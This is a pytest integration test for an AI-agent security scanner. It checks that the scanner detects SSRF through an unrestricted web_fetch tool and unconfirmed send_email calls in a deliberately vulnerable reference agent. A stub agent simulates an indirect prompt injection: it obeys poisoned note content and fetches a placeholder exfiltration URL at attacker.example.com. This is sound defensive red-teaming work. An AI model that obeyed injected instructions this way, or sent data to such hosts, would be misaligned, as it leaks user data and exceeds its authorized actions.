"""End-to-end ScanEngine integration test for W3 + W4 against ``reference:vulnerable``.

Mirror of ``test_scan_vulnerable.py`` but covers the excessive-agency family:
W3 (unrestricted ``web_fetch`` / SSRF) and W4 (unconfirmed ``send_email``).
The planner stub routes by user-message shape and drives each seed to the
predicate-firing outcome on the vulnerable server.
"""

from __future__ import annotations

import json
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from mylonite.plugins._reference.excessive_agency_module import (
    ExcessiveAgencyAttackModule,
)
from mylonite.plugins._reference.reference_target_adapter import (
    InProcessReferenceAdapter,
)
from mylonite.scan.customiser import PayloadCustomiser
from mylonite.scan.engine import ScanConfig, ScanEngine
from mylonite.scan.judge import SuccessJudge


def _text(text: str) -> SimpleNamespace:
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content=text, tool_calls=None))]
    )


def _tool_call(name: str, arguments: dict[str, Any], call_id: str = "c") -> SimpleNamespace:
    return SimpleNamespace(
        id=call_id,
        function=SimpleNamespace(name=name, arguments=json.dumps(arguments)),
    )


def _tool_response(calls: list[SimpleNamespace]) -> SimpleNamespace:
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content="", tool_calls=calls))]
    )


class _AdapterPlannerStub:
    """Drives each seed to its predicate-firing outcome.

    Routing is by the first user message — drive=fetch_url_direct gives
    'Please fetch http://attacker.example.com/...', drive=send_email_direct
    gives 'Please send an email to ops@example.com...', and the
    note-based drives say 'Please read note n_xxx...'.
    """

    def __init__(self) -> None:
        self.iter_per_seed: dict[str, int] = {}

    async def __call__(self, **kwargs: Any) -> SimpleNamespace:
        messages = kwargs.get("messages", [])
        user_msg = next(
            (m["content"] for m in reversed(messages) if m.get("role") == "user"),
            "",
        )
        step = self.iter_per_seed.setdefault(user_msg, 0)
        self.iter_per_seed[user_msg] = step + 1

        if "fetch http://attacker.example.com" in user_msg:
            # W3 direct: planner calls web_fetch on the attacker URL.
            if step == 0:
                return _tool_response(
                    [_tool_call("web_fetch", {"url": "http://attacker.example.com/exfil"})]
                )
            return _text("done.")
        if "send an email to ops@example.com" in user_msg:
            # W4 direct: planner calls send_email (vulnerable dispatches immediately).
            if step == 0:
                return _tool_response(
                    [
                        _tool_call(
                            "send_email",
                            {"to": "ops@example.com", "subject": "Status update", "body": "OK"},
                        )
                    ]
                )
            return _text("done.")
        if "summarise" in user_msg.lower() or "summarize" in user_msg.lower():
            # Note-based seeds. The note body content (poisoned by the seed)
            # arrived as a tool response in messages — we look for it to
            # decide which follow-up tool to call.
            note_id = user_msg.split("note ")[1].split(" ")[0]
            if step == 0:
                return _tool_response([_tool_call("read_note", {"note_id": note_id})])
            if step == 1:
                # Inspect the last tool message (the note content) to decide.
                last_tool = next(
                    (m.get("content", "") for m in reversed(messages) if m.get("role") == "tool"),
                    "",
                )
                if "web_fetch" in last_tool or "attacker.example.com" in last_tool:
                    return _tool_response(
                        [
                            _tool_call(
                                "web_fetch",
                                {"url": "http://attacker.example.com/exfil"},
                                call_id="c2",
                            )
                        ]
                    )
                if "send_email" in last_tool or "send an email" in last_tool.lower():
                    return _tool_response(
                        [
                            _tool_call(
                                "send_email",
                                {
                                    "to": "ops@example.com",
                                    "subject": "Auto-alert",
                                    "body": "Triggered.",
                                },
                                call_id="c2",
                            )
                        ]
                    )
                return _text("done.")
            return _text("done.")
        return _text("done.")


async def _customiser_completion(**kwargs: Any) -> SimpleNamespace:
    """Pass the original seed body through as the 'refined' body so the
    planner-stub's routing-by-user-message logic still works."""
    messages = kwargs.get("messages", [])
    user_msg = next(
        (m["content"] for m in reversed(messages) if m.get("role") == "user"),
        "",
    )
    # The customiser's user message embeds 'SEED PATTERN (...):\n<seed_body>'.
    # Extract the seed body verbatim and echo it as the refined body.
    marker = "SEED PATTERN ("
    if marker in user_msg:
        seed_block = user_msg.split(marker, 1)[1]
        # Skip past the closing ')\n' to find the actual seed body.
        if ")\n" in seed_block:
            body = seed_block.split(")\n", 1)[1].split("\n\n")[0].strip()
        else:
            body = seed_block.strip()
    else:
        body = "REFINED"
    return _text(json.dumps({"body": body}))


async def _judge_passthrough(**kwargs: Any) -> SimpleNamespace:
    del kwargs
    return _text(json.dumps({"success": False, "confidence": 0.0, "reason": "n/a"}))


@pytest.mark.asyncio
async def test_scan_vulnerable_finds_both_w3_and_w4(tmp_path: Path) -> None:
    adapter = InProcessReferenceAdapter(
        variant="vulnerable",
        model="stub",
        completion_fn=_AdapterPlannerStub(),
    )
    customiser = PayloadCustomiser(model="stub", completion_fn=_customiser_completion)
    judge = SuccessJudge(model="stub", completion_fn=_judge_passthrough)

    config = ScanConfig(
        target_id="reference:vulnerable",
        provider="anthropic",
        model="stub",
        max_llm_calls=200,
        max_concurrent=1,
        output_dir=tmp_path,
    )
    engine = ScanEngine(
        config=config,
        adapter=adapter,
        attack_modules=[ExcessiveAgencyAttackModule()],
        customiser=customiser,
        judge=judge,
    )

    result = await engine.run()
    findings_by_predicate = {
        attempt.verdict_reason for attempt in result.report.attempts if attempt.outcome == "finding"
    }
    assert result.report.findings_count >= 2, result.report
    # At least one finding should reference the W3 SSRF/web_fetch predicate.
    assert any(
        "web_fetch" in (r or "").lower() or "ssrf" in (r or "").lower()
        for r in findings_by_predicate
    ), findings_by_predicate
    # At least one finding should reference the W4 send_email predicate.
    assert any(
        "send_email" in (r or "").lower() for r in findings_by_predicate
    ), findings_by_predicate
    assert result.report.aborted is None
